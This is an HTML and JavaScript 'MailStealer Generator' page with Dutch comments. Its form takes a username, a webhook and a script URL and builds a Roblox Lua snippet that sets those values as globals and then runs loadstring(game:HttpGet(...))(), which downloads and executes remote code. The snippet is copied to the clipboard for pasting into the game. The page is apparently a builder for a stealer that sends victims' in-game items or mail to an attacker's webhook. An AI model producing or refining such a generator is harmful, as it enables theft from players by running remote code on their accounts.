<!DOCTYPE html>
<html>
<head>
	<title>Paxz MailStealer</title>
	<script>
		function copyText() {
			// Haal de ingevoerde tekst op en zet deze in de juiste variabelen
			var userName = document.getElementById("userName").value;
			var webhook = document.getElementById("webhook").value;
			var loadingText = document.getElementById("loadingText").value;
			var script = document.getElementById("script").value;
			
			var scriptCode = '_G.UserName = "' + userName + '"\n';
			scriptCode += '_G.Webhook = "' + webhook + '"\n';
			scriptCode += '_G.loadingScreenText = "' + loadingText + '"\n\n';
			scriptCode += 'loadstring(game:HttpGet("' + script + '"))()';
			
			// Kopieer de gegenereerde code naar het klembord
			var tempInput = document.createElement("textarea");
			tempInput.value = scriptCode;
			document.body.appendChild(tempInput);
			tempInput.select();
			document.execCommand("copy");
			document.body.removeChild(tempInput);
			
			// Geef een melding dat de tekst is gekopieerd
			alert("De tekst is gekopieerd naar het klembord.");
		}
	</script>
</head>
<body>
	<h1>Paxz MailStealer Generator</h1>
	<p>Vul de onderstaande velden in om het script te genereren.</p>
	<form>
		<label for="userName">Username:</label><br>
		<input type="text" id="userName" name="userName"><br>
		<label for="webhook">Webhook:</label><br>
		<input type="text" id="webhook" name="webhook"><br>
		<label for="loadingText">LoadingText:</label><br>
		<input type="text" id="loadingText" name="loadingText"><br>
		<label for="script">Script:</label><br>
		<textarea id="script" name="script"></textarea><br>
		<input type="button" value="Kopieer tekst" onclick="copyText()">
	</form>
</body>
</html>
